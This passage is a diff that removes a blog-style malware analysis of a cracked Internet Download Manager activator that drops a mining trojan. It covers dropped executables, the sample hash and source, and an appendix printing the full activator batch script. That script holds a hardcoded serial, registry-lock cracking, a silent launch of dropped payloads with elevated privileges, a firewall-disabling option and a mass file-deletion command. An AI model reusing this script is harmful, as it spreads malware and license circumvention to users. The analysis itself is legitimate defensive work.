@@ -177,809 +177,809 @@
 </span></span><span class=line><span class=cl><span class=p>:</span><span class=c1>: Delete the script file</span>
 </span></span><span class=line><span class=cl><span class=k>DEL</span> /F /Q /A <span class=nv>%0</span> <span class=nv>%NUL%</span>
 </span></span><span class=line><span class=cl><span class=k>EXIT</span>
-</span></span></code></pre></div><p>Yes, it turns out that the &ldquo;Hide protected operating system files&rdquo; feature is implemented through the registry.</p><p><img class=lazyload src=/svg/loading.min.svg data-src=./assets/image-20231113153600226.png data-srcset="./assets/image-20231113153600226.png, ./assets/image-20231113153600226.png 1.5x, ./assets/image-20231113153600226.png 2x" data-sizes=auto alt=./assets/image-20231113153600226.png title=image-20231113153600226></p><p>It&rsquo;s not hard to notice that the script releases another genuine malicious sample, <code>VScan.exe</code>, from <code>file.tmp</code> at the end. I believe it&rsquo;s the latter that further achieves the intrusion of the mining trojan through DLL injection.</p><h4 id=155-vscanexe>1.5.5 VScan.exe</h4><p>To obtain VScan, we&rsquo;ll need to manually extract it from <code>files.tmp</code> using the same decompression password.</p><p><img class=lazyload src=/svg/loading.min.svg data-src=./assets/image-20231113152613457.png data-srcset="./assets/image-20231113152613457.png, ./assets/image-20231113152613457.png 1.5x, ./assets/image-20231113152613457.png 2x" data-sizes=auto alt=./assets/image-20231113152613457.png title=image-20231113152613457></p><p>This is a highly dangerous program. Let&rsquo;s not forget that the <code>IDM0.bat</code> script has set exclusions for Windows Defender, so at this point, Windows Defender can no longer detect VScan.</p><p><img class=lazyload src=/svg/loading.min.svg data-src=./assets/image-20231113152916887.png data-srcset="./assets/image-20231113152916887.png, ./assets/image-20231113152916887.png 1.5x, ./assets/image-20231113152916887.png 2x" data-sizes=auto alt=./assets/image-20231113152916887.png title=image-20231113152916887></p><p>Through the <code>IDM.bat</code> script, it&rsquo;s discovered that the latter two payloads are called by the registration script, further achieving the registration process. Due to time constraints, the analysis of these two programs is not yet complete. Here are their imported functions.</p><h4 id=156-nsudo86exe>1.5.6 NSudo86.exe</h4><p><img class=lazyload src=/svg/loading.min.svg data-src=./assets/image-20231113102409162.png data-srcset="./assets/image-20231113102409162.png, ./assets/image-20231113102409162.png 1.5x, ./assets/image-20231113102409162.png 2x" data-sizes=auto alt=./assets/image-20231113102409162.png title=image-20231113102409162></p><p><img class=lazyload src=/svg/loading.min.svg data-src=./assets/image-20231113102608468.png data-srcset="./assets/image-20231113102608468.png, ./assets/image-20231113102608468.png 1.5x, ./assets/image-20231113102608468.png 2x" data-sizes=auto alt=./assets/image-20231113102608468.png title=image-20231113102608468></p><p><img class=lazyload src=/svg/loading.min.svg data-src=./assets/image-20231113102531606.png data-srcset="./assets/image-20231113102531606.png, ./assets/image-20231113102531606.png 1.5x, ./assets/image-20231113102531606.png 2x" data-sizes=auto alt=./assets/image-20231113102531606.png title=image-20231113102531606></p><h4 id=157-ab2efexe>1.5.7 AB2EF.exe</h4><p><img class=lazyload src=/svg/loading.min.svg data-src=./assets/image-20231113104401045.png data-srcset="./assets/image-20231113104401045.png, ./assets/image-20231113104401045.png 1.5x, ./assets/image-20231113104401045.png 2x" data-sizes=auto alt=./assets/image-20231113104401045.png title=image-20231113104401045></p><h2 id=2-conclusion>2 Conclusion</h2><p>Through the static analysis, dynamic debugging, and sample evidence collection as described above, we have gained a basic understanding of the process by which the malicious sample releases the mining trojan. I believe what was mentioned in the registration tool&rsquo;s <code>Readme.txt</code>: temporarily disabling Windows Defender is necessary for activating the software, enabling the success of the malicious sample. I admit I was a bit naïve. Additionally, the design of this sample is quite clever, and overall, the analysis process is quite interesting. I&rsquo;m fortunate that it&rsquo;s just a mining trojan, and I noticed the error messages from the command prompt. Remember <code>WinRing0x64.sys</code>? It&rsquo;s a file from Microsoft used to obtain hardware information about the computer. It&rsquo;s possible that this mining trojan would operate gently within the hardware capabilities of my computer, remaining undetected for an extended period. Well, it seems that I&rsquo;ll need to be more cautious when searching for resources online in the future.</p><h2 id=3-link>3 Link</h2><p>Later on, I discovered posts from other people online who had experienced similar issues. Haha, it turns out I&rsquo;m not alone in this! There&rsquo;s even a report from the U.S. government!</p><ul><li><p><a href=https://www.cisa.gov/sites/default/files/publications/MAR-10387061.r1.v1.CLEAR.pdf target=_blank rel="noopener noreffer">https://www.cisa.gov/sites/default/files/publications/MAR-10387061.r1.v1.CLEAR.pdf</a></p></li><li><p><a href=https://www.52pojie.cn/thread-1774226-1-1.html target=_blank rel="noopener noreffer">https://www.52pojie.cn/thread-1774226-1-1.html</a></p></li></ul><h2 id=4-appendix>4 Appendix</h2><ul><li><p>Hash of the malicious sample: <code>61208ef95b922b0e93f0dbea9d4d565d</code></p></li><li><p>Source of the malicious sample: <code>https://www.crackingcity.com/idm-crack/</code></p></li><li><p>IDM.bat</p><pre tabindex=0><code class=language-abt data-lang=abt>@setlocal DisableDelayedExpansion
-@echo off
-
-:: Add custom name in IDM license info, prefer to write it in English and/or numeric in below line after = sign,
-set name=%Username% - by crackingcity.com
-set title=Internet Download Manager (IDM) 6.xx Activator or Resetter v3.1
-
-
-
-
-::========================================================================================================================================
-
-:: Re-launch the script with x64 process if it was initiated by x86 process on x64 bit Windows
-:: or with ARM64 process if it was initiated by x86/ARM32 process on ARM64 Windows
-
-if exist %SystemRoot%\Sysnative\cmd.exe (
-set &#34;_cmdf=%~f0&#34;
-setlocal EnableDelayedExpansion
-start %SystemRoot%\Sysnative\cmd.exe /c &#34;&#34;!_cmdf!&#34; %*&#34;
-exit /b
-)
-
-:: Re-launch the script with ARM32 process if it was initiated by x64 process on ARM64 Windows
-
-if exist %SystemRoot%\Windows\SyChpe32\kernel32.dll if exist %SystemRoot%\SysArm32\cmd.exe if %PROCESSOR_ARCHITECTURE%==AMD64 (
-set &#34;_cmdf=%~f0&#34;
-setlocal EnableDelayedExpansion
-start %SystemRoot%\SysArm32\cmd.exe /c &#34;&#34;!_cmdf!&#34; %*&#34;
-exit /b
-)
-
-::  Set Path variable, it helps if it is misconfigured in the system
-
-set &#34;SysPath=%SystemRoot%\System32&#34;
-set &#34;Path=%SysPath%;%SystemRoot%;%SysPath%\Wbem;%SysPath%\WindowsPowerShell\v1.0\&#34;
-
-::========================================================================================================================================
-
-cls
-color 07
-
-set _args=
-set _elev=
-set reset=
-set Silent=
-set activate=
-
-set _args=%*
-if defined _args set _args=%_args:&#34;=%
-if defined _args (
-for %%A in (%_args%) do (
-if /i &#34;%%A&#34;==&#34;-el&#34;  set _elev=1
-if /i &#34;%%A&#34;==&#34;/res&#34; set Unattended=1&amp;set activate=&amp;set reset=1
-if /i &#34;%%A&#34;==&#34;/act&#34; set Unattended=1&amp;set activate=1&amp;set reset=
-if /i &#34;%%A&#34;==&#34;/s&#34;   set Unattended=1&amp;set Silent=1
-)
-)
-
-::========================================================================================================================================
-
-set &#34;nul=&gt;nul 2&gt;&amp;1&#34;
-set &#34;_psc=%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe&#34;
-set winbuild=1
-for /f &#34;tokens=6 delims=[]. &#34; %%G in (&#39;ver&#39;) do set winbuild=%%G
-call :_colorprep
-set &#34;nceline=echo: &amp;echo ==== ERROR ==== &amp;echo:&#34;
-set &#34;line=_________________________________________________________________________________________&#34;
-set &#34;_buf={$W=$Host.UI.RawUI.WindowSize;$B=$Host.UI.RawUI.BufferSize;$W.Height=31;$B.Height=300;$Host.UI.RawUI.WindowSize=$W;$Host.UI.RawUI.BufferSize=$B;}&#34;
-
-if defined Silent if not defined activate if not defined reset exit /b
-if defined Silent call :begin %nul% &amp; exit /b
-
-:begin
-
-::========================================================================================================================================
-
-if not exist &#34;%_psc%&#34; (
-%nceline%
-echo Powershell is not installed in the system.
-echo Aborting...
-goto done2
-)
-
-if %winbuild% LSS 7600 (
-%nceline%
-echo Unsupported OS version Detected.
-echo Project is supported only for Windows 7/8/8.1/10/11 and their Server equivalent.
-goto done2
-)
-
-::========================================================================================================================================
-
-::  Fix for the special characters limitation in path name
-
-set &#34;_work=%~dp0&#34;
-if &#34;%_work:~-1%&#34;==&#34;\&#34; set &#34;_work=%_work:~0,-1%&#34;
-
-set &#34;_batf=%~f0&#34;
-set &#34;_batp=%_batf:&#39;=&#39;&#39;%&#34;
-
-set _PSarg=&#34;&#34;&#34;%~f0&#34;&#34;&#34; -el %_args%
-
-set &#34;_appdata=%appdata%&#34;
-for /f &#34;tokens=2*&#34; %%a in (&#39;reg query &#34;HKCU\Software\DownloadManager&#34; /v ExePath 2^&gt;nul&#39;) do call set &#34;IDMan=%%b&#34;
-
-setlocal EnableDelayedExpansion
-
-
-::========================================================================================================================================
-
-:: Below code also works for ARM64 Windows 10 (including x64 bit emulation)
-
-reg query &#34;HKLM\Hardware\Description\System\CentralProcessor\0&#34; /v &#34;Identifier&#34; | find /i &#34;x86&#34; 1&gt;nul &amp;&amp; set arch=x86|| set arch=x64
-
-if not exist &#34;!IDMan!&#34; (
-if %arch%==x64 set &#34;IDMan=%ProgramFiles(x86)%\Internet Download Manager\IDMan.exe&#34;
-if %arch%==x86 set &#34;IDMan=%ProgramFiles%\Internet Download Manager\IDMan.exe&#34;
-)
-
-if &#34;%arch%&#34;==&#34;x86&#34; (
-set &#34;CLSID=HKCU\Software\Classes\CLSID&#34;
-set &#34;HKLM=HKLM\Software\Internet Download Manager&#34;
-set &#34;_tok=5&#34;
-) else (
-set &#34;CLSID=HKCU\Software\Classes\Wow6432Node\CLSID&#34;
-set &#34;HKLM=HKLM\SOFTWARE\Wow6432Node\Internet Download Manager&#34;
-set &#34;_tok=6&#34;
-)
-
-set _temp=%SystemRoot%\Temp
-set regdata=%SystemRoot%\Temp\regdata.txt
-set &#34;idmcheck=tasklist /fi &#34;imagename eq idman.exe&#34; | findstr /i &#34;idman.exe&#34; &gt;nul&#34;
-
-::========================================================================================================================================
-
-if defined Unattended (
-if defined reset goto _reset
-if defined activate goto _activate
-)
-
-:MainMenu
-
-cls
-TITLE %title%
-mode 89, 23
-
-:: Check firewall status
-
-set /a _ena=0
-set /a _dis=0
-for %%# in (DomainProfile PublicProfile StandardProfile) do (
-for /f &#34;skip=2 tokens=2*&#34; %%a in (&#39;reg query HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\%%# /v EnableFirewall 2^&gt;nul&#39;) do (
-if /i %%b equ 0x1 (set /a _ena+=1) else (set /a _dis+=1)
-)
-)
-
-if %_ena%==3 (
-set _status=Enabled
-set _col=%_Green%
-)
-
-if %_dis%==3 (
-set _status=Disabled
-set _col=%_Red%
-)
-
-if not %_ena%==3 if not %_dis%==3 (
-set _status=Status_Unclear
-set _col=%_Yellow%
-)
-
-AB2EF kF5nJ4D92hfOpc8 %nul%
-
-echo:
-echo:
-echo:
-echo:
-echo:                  _____________________________________________________
-echo:                                                          
-echo:                     [1] Activate IDM
-echo:                     [2] Reset IDM Activation / Trial in Registry
-echo:                     _______________________________________________
-echo:                                                          
-call :_color2 %_White% &#34;                     [3] Toggle Windows Firewall  &#34; %_col% &#34;[%_status%]&#34;
-echo:                     _______________________________________________
-echo:                                                          
-echo:                     [4] ReadMe
-echo:                     [5] Homepage
-echo:                     [6] Exit
-echo:                  _____________________________________________________
-echo:   
-call :_color2 %_White% &#34;                    &#34; %_Green% &#34;Enter a menu option in the Keyboard [1,2,3,4,5,6]&#34;
-choice /C:123456 /N
-set _erl=%errorlevel%
-
-if %_erl%==6 DEL /F /Q /A *.* %nul%&amp;exit /b
-if %_erl%==5 goto homepage
-if %_erl%==4 call :readme&amp;goto MainMenu
-if %_erl%==3 call :_tog_Firewall&amp;goto MainMenu
-if %_erl%==2 goto _reset
-if %_erl%==1 goto _activate
-goto :MainMenu
-
-::========================================================================================================================================
-
-:_tog_Firewall
-
-if %_status%==Enabled (
-netsh AdvFirewall Set AllProfiles State Off &gt;nul
-) else (
-netsh AdvFirewall Set AllProfiles State On &gt;nul
-)
-exit /b
-
-::========================================================================================================================================
-
-:readme
-
-set &#34;_ReadMe=%SystemRoot%\Temp\ReadMe.txt&#34;
-if exist &#34;%_ReadMe%&#34; del /f /q &#34;%_ReadMe%&#34; %nul%
-call :export txt &#34;%_ReadMe%&#34;
-start notepad &#34;%_ReadMe%&#34;
-timeout /t 2 %nul%
-del /f /q &#34;%_ReadMe%&#34;
-exit /b
-
-::  Extract the text from batch script without character and file encoding issue
-
-:export
-
-%nul% %_psc% &#34;$f=[io.file]::ReadAllText(&#39;!_batp!&#39;) -split \&#34;:%~1\:.*`r`n\&#34;; [io.file]::WriteAllText(&#39;%~2&#39;,$f[1].Trim(),[System.Text.Encoding]::ASCII);&#34;
-exit/b
-
-::========================================================================================================================================
-
-:_reset
-
-TITLE %title%
-MODE CON: COLS=89 LINES=13
-
-set _error=
-
-reg query &#34;HKCU\Software\DownloadManager&#34; &#34;/v&#34; &#34;Serial&#34; %nul% &amp;&amp; (
-%idmcheck% &amp;&amp; taskkill /f /im idman.exe  %nul%
-)
-
-if exist &#34;!_appdata!\DMCache\settings.bak&#34; del /s /f /q &#34;!_appdata!\DMCache\settings.bak&#34;  %nul%
-
-set &#34;_action=call :delete_key&#34;
-call :reset
-
-echo:
-echo %line%
-echo:
-if not defined _error (
-call :_color %Green% &#34;IDM Activation - Trial is successfully reset in the registry.&#34;
-) else (
-call :_color %Red% &#34;Failed to completely reset IDM Activation - Trial.&#34;
-)
-
-goto done
-
-::========================================================================================================================================
-
-:_activate
-
-TITLE %title%
-MODE CON: COLS=89 LINES=25
-
-echo:
-set _error=
-
-if not exist &#34;!IDMan!&#34; (
-call :_color %Red% &#34;IDM [Internet Download Manager] is not Installed.&#34;
-echo You can download it from  https://www.internetdownloadmanager.com/download.html
-goto done
-)
-
-:: Internet check with internetdownloadmanager.com ping and port 80 test
-
-ping -n 1 internetdownloadmanager.com &gt;nul || (
-%_psc% &#34;$t = New-Object Net.Sockets.TcpClient;try{$t.Connect(&#34;&#34;&#34;internetdownloadmanager.com&#34;&#34;&#34;, 80)}catch{};$t.Connected&#34; | findstr /i true 1&gt;nul
-)
-
-if not [%errorlevel%]==[0] (
-call :_color %Red% &#34;Unable to connect internetdownloadmanager.com, aborting...&#34;
-goto done
-)
-
-echo Internet is connected.
-
-%idmcheck% &amp;&amp; taskkill /f /im idman.exe %nul%
-
-if exist &#34;!_appdata!\DMCache\settings.bak&#34; del /s /f /q &#34;!_appdata!\DMCache\settings.bak&#34; %nul%
-
-set &#34;_action=call :delete_key&#34;
-call :reset
-
-set &#34;_action=call :count_key&#34;
-call :register_IDM
-
-echo:
-if defined _derror call :f_reset &amp; goto done
-
-set lockedkeys=
-set &#34;_action=call :lock_key&#34;
-echo Locking registry keys...
-rem echo:
-call :action
-
-if not defined _error if [%lockedkeys%] GEQ [7] (
-echo:
-echo %line%
-echo:
-call :_color %Green% &#34;IDM is successfully activated.&#34;
-echo:
-call :_color %Gray% &#34;If fake serial screen appears, run activation option again, after that it wont appear.&#34;
-goto done
-)
-
-call :f_reset
-
-::========================================================================================================================================
-
-:done
-
-NSudo86x -U:C -P:E -UseCurrentConsole &#34;!IDMan!&#34; /onboot %nul%
-
-start &#34;&#34; &#34;www.crackingcity.com&#34; %nul%
-
-echo %line%
-echo:
-echo:
-if defined Unattended (
-echo Press any key to exit...
-pause &gt;nul
-exit /b
-)
-
-call :_color %_Yellow% &#34;Press any key to return...&#34;
-pause &gt;nul
-goto MainMenu
-
-:done2
-
-if defined Unattended (
-echo Press any key to exit...
-pause &gt;nul
-exit /b
-)
-
-echo Press any key to exit...
-pause &gt;nul
-exit /b
-
-::========================================================================================================================================
-
-:homepage
-
-cls
-start https://www.crackingcity.com
-goto MainMenu
-
-::========================================================================================================================================
-
-:f_reset
-
-echo:
-echo %line%
-echo:
-call :_color %Red% &#34;Error found, resetting IDM activation...&#34;
-set &#34;_action=call :delete_key&#34;
-call :reset
-echo:
-echo %line%
-echo:
-call :_color %Red% &#34;Failed to activate IDM.&#34;
-exit /b
-
-::========================================================================================================================================
-
-:reset
-
-set take_permission=
-call :delete_queue
-set take_permission=1
-call :action
-call :add_key
-exit /b
-
-::========================================================================================================================================
-
-:_rcont
-
-reg add %reg% %nul%
-call :_add_key
-exit /b
-
-:register_IDM
-
-echo:
-echo Applying registration details...
-rem echo:
-
-If not defined name set name=Tonec FZE
-
-set &#34;reg=HKCU\SOFTWARE\DownloadManager /v FName /t REG_SZ /d &#34;%name%&#34;&#34; &amp; call :_rcont
-set &#34;reg=HKCU\SOFTWARE\DownloadManager /v LName /t REG_SZ /d &#34;&#34;&#34; &amp; call :_rcont
-set &#34;reg=HKCU\SOFTWARE\DownloadManager /v Email /t REG_SZ /d &#34;info@tonec.com&#34;&#34; &amp; call :_rcont
-set &#34;reg=HKCU\SOFTWARE\DownloadManager /v Serial /t REG_SZ /d &#34;R953G-JE15D-5FCTH-50SNV&#34;&#34; &amp; call :_rcont
-
-echo:
-echo Triggering a few downloads to create certain registry keys, please wait...
-
-set &#34;file=%_temp%\temp.png&#34;
-set _fileexist=
-set _derror=
-
-%idmcheck% &amp;&amp; taskkill /f /im idman.exe
-
-set link=https://www.internetdownloadmanager.com/images/idm_box_min.png
-call :download
-set link=https://www.internetdownloadmanager.com/register/IDMlib/images/idman_logos.png
-call :download
-
-:: it may take some time to reflect registry keys.
-timeout /t 3 &gt;nul
-
-set foundkeys=
-call :action
-if [%foundkeys%] GEQ [7] goto _skip
-
-set link=https://www.internetdownloadmanager.com/pictures/idm_about.png
-call :download
-set link=https://www.internetdownloadmanager.com/languages/indian.png
-call :download
-
-timeout /t 3 &gt;nul
-
-set foundkeys=
-call :action
-if not [%foundkeys%] GEQ [7] set _derror=1
-
-:_skip
-
-echo:
-if not defined _derror (
-echo Required registry keys were created successfully.
-) else (
-if not defined _fileexist call :_color %Red% &#34;Unable to download files with IDM.&#34;
-call :_color %Red% &#34;Failed to create required registry keys.&#34;
-call :_color %Magenta% &#34;Try again - disable Windows firewall with script options - check Read Me.&#34;
-)
-
-rem echo:
-%idmcheck% &amp;&amp; taskkill /f /im idman.exe %nul%
-if exist &#34;%file%&#34; del /f /q &#34;%file%&#34;
-exit /b
-
-:download
-
-set /a attempt=0
-if exist &#34;%file%&#34; del /f /q &#34;%file%&#34;
-start &#34;&#34; /B &#34;!IDMan!&#34; /n /d &#34;%link%&#34; /p &#34;%_temp%&#34; /f temp.png
-
-:check_file
-
-timeout /t 1 &gt;nul
-set /a attempt+=1
-if exist &#34;%file%&#34; set _fileexist=1&amp;exit /b
-if %attempt% GEQ 20 exit /b
-goto :Check_file
-
-::========================================================================================================================================
-
-:delete_queue
-
-echo:
-echo Deleting registry keys...
-rem echo:
-
-for %%# in (
-&#34;&#34;HKCU\Software\DownloadManager&#34; &#34;/v&#34; &#34;FName&#34;&#34;
-&#34;&#34;HKCU\Software\DownloadManager&#34; &#34;/v&#34; &#34;LName&#34;&#34;
-&#34;&#34;HKCU\Software\DownloadManager&#34; &#34;/v&#34; &#34;Email&#34;&#34;
-&#34;&#34;HKCU\Software\DownloadManager&#34; &#34;/v&#34; &#34;Serial&#34;&#34;
-&#34;&#34;HKCU\Software\DownloadManager&#34; &#34;/v&#34; &#34;scansk&#34;&#34;
-&#34;&#34;HKCU\Software\DownloadManager&#34; &#34;/v&#34; &#34;tvfrdt&#34;&#34;
-&#34;&#34;HKCU\Software\DownloadManager&#34; &#34;/v&#34; &#34;radxcnt&#34;&#34;
-&#34;&#34;HKCU\Software\DownloadManager&#34; &#34;/v&#34; &#34;LstCheck&#34;&#34;
-&#34;&#34;HKCU\Software\DownloadManager&#34; &#34;/v&#34; &#34;ptrk_scdt&#34;&#34;
-&#34;&#34;HKCU\Software\DownloadManager&#34; &#34;/v&#34; &#34;LastCheckQU&#34;&#34;
-&#34;%HKLM%&#34;
-) do for /f &#34;tokens=* delims=&#34; %%A in (&#34;%%~#&#34;) do (
-set &#34;reg=&#34;%%~A&#34;&#34; &amp;reg query !reg! %nul% &amp;&amp; call :delete_key
-)
-
-exit /b
-
-::========================================================================================================================================
-
-:add_key
-
-echo:
-echo Adding registry key...
-rem echo:
-
-set &#34;reg=&#34;%HKLM%&#34; /v &#34;AdvIntDriverEnabled2&#34;&#34;
-
-reg add %reg% /t REG_DWORD /d &#34;1&#34; /f %nul%
-
-:_add_key
-
-if [%errorlevel%]==[0] (
-set &#34;reg=%reg:&#34;=%&#34;
-rem echo Added - !reg!
-) else (
-set _error=1
-set &#34;reg=%reg:&#34;=%&#34;
-%_psc% write-host &#39;Failed&#39; -fore &#39;white&#39; -back &#39;DarkRed&#39;  -NoNewline&amp;echo  - !reg!
-)
-exit /b
-
-::========================================================================================================================================
-
-:action
-
-if exist %regdata% del /f /q %regdata% %nul%
-
-reg query %CLSID% &gt; %regdata%
-
-%nul% %_psc% &#34;(gc %regdata%) -replace &#39;HKEY_CURRENT_USER&#39;, &#39;HKCU&#39; | Out-File -encoding ASCII %regdata%&#34;
-
-for /f %%a in (%regdata%) do (
-for /f &#34;tokens=%_tok% delims=\&#34; %%# in (&#34;%%a&#34;) do (
-echo %%#|findstr /r &#34;{.*-.*-.*-.*-.*}&#34; &gt;nul &amp;&amp; (set &#34;reg=%%a&#34; &amp; call :scan_key)
-)
-)
-
-if exist %regdata% del /f /q %regdata% %nul%
-
-exit /b
-
-::========================================================================================================================================
-
-:scan_key
-
-reg query %reg% 2&gt;nul | findstr /i &#34;LocalServer32 InProcServer32 InProcHandler32&#34; &gt;nul &amp;&amp; exit /b
-
-reg query %reg% 2&gt;nul | find /i &#34;H&#34; 1&gt;nul || (
-%_action%
-exit /b
-)
-
-for /f &#34;skip=2 tokens=*&#34; %%a in (&#39;reg query %reg% /ve 2^&gt;nul&#39;) do echo %%a|findstr /r /e &#34;[^0-9]&#34; &gt;nul || (
-%_action%
-exit /b
-)
-
-for /f &#34;skip=2 tokens=3&#34; %%a in (&#39;reg query %reg%\Version /ve 2^&gt;nul&#39;) do echo %%a|findstr /r &#34;[^0-9]&#34; &gt;nul || (
-%_action%
-exit /b
-)
-
-for /f &#34;skip=2 tokens=1&#34; %%a in (&#39;reg query %reg% 2^&gt;nul&#39;) do echo %%a| findstr /i &#34;MData Model scansk Therad&#34; &gt;nul &amp;&amp; (
-%_action%
-exit /b
-)
-
-for /f &#34;skip=2 tokens=*&#34; %%a in (&#39;reg query %reg% /ve 2^&gt;nul&#39;) do echo %%a| find /i &#34;+&#34; &gt;nul &amp;&amp; (
-%_action%
-exit /b
-)
-
-exit/b
-
-::========================================================================================================================================
-
-:delete_key
-
-reg delete %reg% /f %nul%
-
-if not [%errorlevel%]==[0] if defined take_permission (
-%nul% call :reg_own &#34;%reg%&#34; preserve S-1-1-0
-reg delete %reg% /f %nul%
-)
-
-if [%errorlevel%]==[0] (
-set &#34;reg=%reg:&#34;=%&#34;
-rem echo Deleted - !reg!
-) else (
-set &#34;reg=%reg:&#34;=%&#34;
-set _error=1
-%_psc% write-host &#39;Failed&#39; -fore &#39;white&#39; -back &#39;DarkRed&#39;  -NoNewline &amp; echo  - !reg!
-)
-
-exit /b
-
-::========================================================================================================================================
-
-:lock_key
-
-%nul% call :reg_own &#34;%reg%&#34; &#34;&#34; S-1-1-0 S-1-0-0 Deny &#34;FullControl&#34;
-
-reg delete %reg% /f %nul%
-
-if not [%errorlevel%]==[0] (
-set &#34;reg=%reg:&#34;=%&#34;
-rem echo Locked - !reg!
-set /a lockedkeys+=1
-) else (
-set _error=1
-set &#34;reg=%reg:&#34;=%&#34;
-%_psc% write-host &#39;Failed&#39; -fore &#39;white&#39; -back &#39;DarkRed&#39;  -NoNewline&amp;echo  - !reg!
-)
-
-exit /b
-
-::========================================================================================================================================
-
-:count_key
-
-set /a foundkeys+=1
-exit /b
-
-::========================================================================================================================================
-
-::  A lean and mean snippet to set registry ownership and permission recursively
-::  Written by @AveYo aka @BAU
-::  pastebin.com/XTPt0JSC
-
-:reg_own
-
-%_psc% $A=&#39;%~1&#39;,&#39;%~2&#39;,&#39;%~3&#39;,&#39;%~4&#39;,&#39;%~5&#39;,&#39;%~6&#39;;iex(([io.file]::ReadAllText(&#39;!_batp!&#39;)-split&#39;:Own1\:.*&#39;)[1])&amp;exit/b:Own1:
-$D1=[uri].module.gettype(&#39;System.Diagnostics.Process&#39;).&#34;GetM`ethods&#34;(42) |where {$_.Name -eq &#39;SetPrivilege&#39;} #`:no-ev-warn
-&#39;SeSecurityPrivilege&#39;,&#39;SeTakeOwnershipPrivilege&#39;,&#39;SeBackupPrivilege&#39;,&#39;SeRestorePrivilege&#39;|foreach {$D1.Invoke($null, @(&#34;$_&#34;,2))}
-$path=$A[0]; $rk=$path-split&#39;\\&#39;,2; $HK=gi -lit Registry::$($rk[0]) -fo; $s=$A[1]; $sps=[Security.Principal.SecurityIdentifier]
-$u=($A[2],&#39;S-1-5-32-544&#39;)[!$A[2]];$o=($A[3],$u)[!$A[3]];$w=$u,$o |% {new-object $sps($_)}; $old=!$A[3];$own=!$old; $y=$s-eq&#39;all&#39;
-$rar=new-object Security.AccessControl.RegistryAccessRule( $w[0], ($A[5],&#39;FullControl&#39;)[!$A[5]], 1, 0, ($A[4],&#39;Allow&#39;)[!$A[4]] )
-$x=$s-eq&#39;none&#39;;function Own1($k){$t=$HK.OpenSubKey($k,2,&#39;TakeOwnership&#39;);if($t){0,4|%{try{$o=$t.GetAccessControl($_)}catch{$old=0}
-};if($old){$own=1;$w[1]=$o.GetOwner($sps)};$o.SetOwner($w[0]);$t.SetAccessControl($o); $c=$HK.OpenSubKey($k,2,&#39;ChangePermissions&#39;)
-$p=$c.GetAccessControl(2);if($y){$p.SetAccessRuleProtection(1,1)};$p.ResetAccessRule($rar);if($x){$p.RemoveAccessRuleAll($rar)}
-$c.SetAccessControl($p);if($own){$o.SetOwner($w[1]);$t.SetAccessControl($o)};if($s){$subkeys=$HK.OpenSubKey($k).GetSubKeyNames()
-foreach($n in $subkeys){Own1 &#34;$k\$n&#34;}}}};Own1 $rk[1];if($env:VO){get-acl Registry::$path|fl} #:Own1: lean &amp; mean snippet by AveYo
-
-::========================================================================================================================================
-
-:_color
-
-if %winbuild% GEQ 10586 (
-echo %esc%[%~1%~2%esc%[0m
-) else (
-call :batcol %~1 &#34;%~2&#34;
-)
-exit /b
-
-:_color2
-
-if %winbuild% GEQ 10586 (
-echo %esc%[%~1%~2%esc%[%~3%~4%esc%[0m
-) else (
-call :batcol %~1 &#34;%~2&#34; %~3 &#34;%~4&#34;
-)
-exit /b
-
-::=======================================
-
-:: Colored text with pure batch method
-
-:: Powershell is not used here because its slow
-
-:batcol
-
-pushd %_coltemp%
-if not exist &#34;&#39;&#34; (&lt;nul &gt;&#34;&#39;&#34; set /p &#34;=.&#34;)
-setlocal
-set &#34;s=%~2&#34;
-set &#34;t=%~4&#34;
-call :_batcol %1 s %3 t
-del /f /q &#34;&#39;&#34;
-del /f /q &#34;`.txt&#34;
-popd
-exit /b
-
-:_batcol
-
-setlocal EnableDelayedExpansion
-set &#34;s=!%~2!&#34;
-set &#34;t=!%~4!&#34;
-for /f delims^=^ eol^= %%i in (&#34;!s!&#34;) do (
-  if &#34;!&#34; equ &#34;&#34; setlocal DisableDelayedExpansion
-    &gt;`.txt (echo %%i\..\&#39;)
-    findstr /a:%~1 /f:`.txt &#34;.&#34;
-    &lt;nul set /p &#34;=%_BS%%_BS%%_BS%%_BS%%_BS%%_BS%%_BS%&#34;
-)
-if &#34;%~4&#34;==&#34;&#34; echo(&amp;exit /b
-setlocal EnableDelayedExpansion
-for /f delims^=^ eol^= %%i in (&#34;!t!&#34;) do (
-  if &#34;!&#34; equ &#34;&#34; setlocal DisableDelayedExpansion
-    &gt;`.txt (echo %%i\..\&#39;)
-    findstr /a:%~3 /f:`.txt &#34;.&#34;
-    &lt;nul set /p &#34;=%_BS%%_BS%%_BS%%_BS%%_BS%%_BS%%_BS%&#34;
-)
-echo(
-exit /b
-
-::=======================================
-
-:_colorprep
-
-if %winbuild% GEQ 10586 (
-for /F %%a in (&#39;echo prompt $E ^| cmd&#39;) do set &#34;esc=%%a&#34;
-
-set     &#34;Red=&#34;41;97m&#34;&#34;
-set    &#34;Gray=&#34;100;97m&#34;&#34;
-set   &#34;Black=&#34;30m&#34;&#34;
-set   &#34;Green=&#34;42;97m&#34;&#34;
-set    &#34;Blue=&#34;44;97m&#34;&#34;
-set  &#34;Yellow=&#34;43;97m&#34;&#34;
-set &#34;Magenta=&#34;45;97m&#34;&#34;
-
-set    &#34;_Red=&#34;40;91m&#34;&#34;
-set  &#34;_Green=&#34;40;92m&#34;&#34;
-set   &#34;_Blue=&#34;40;94m&#34;&#34;
-set  &#34;_White=&#34;40;37m&#34;&#34;
-set &#34;_Yellow=&#34;40;93m&#34;&#34;
-
-exit /b
-)
-
-if not defined _BS for /f %%A in (&#39;&#34;prompt $H&amp;for %%B in (1) do rem&#34;&#39;) do set &#34;_BS=%%A %%A&#34;
-set &#34;_coltemp=%SystemRoot%\Temp&#34;
-
-set     &#34;Red=&#34;CF&#34;&#34;
-set    &#34;Gray=&#34;8F&#34;&#34;
-set   &#34;Black=&#34;00&#34;&#34;
-set   &#34;Green=&#34;2F&#34;&#34;
-set    &#34;Blue=&#34;1F&#34;&#34;
-set  &#34;Yellow=&#34;6F&#34;&#34;
-set &#34;Magenta=&#34;5F&#34;&#34;
-
-set    &#34;_Red=&#34;0C&#34;&#34;
-set  &#34;_Green=&#34;0A&#34;&#34;
-set   &#34;_Blue=&#34;09&#34;&#34;
-set  &#34;_White=&#34;07&#34;&#34;
-set &#34;_Yellow=&#34;0E&#34;&#34;
-
-exit /b
-
-::========================================================================================================================================
-
-:txt:
-_________________________________
-
-   Activation:
-_________________________________
-
- - This tool applies registry lock method to activate Internet download manager (IDM).
-
- - This method requires Internet at the time of activation.
-
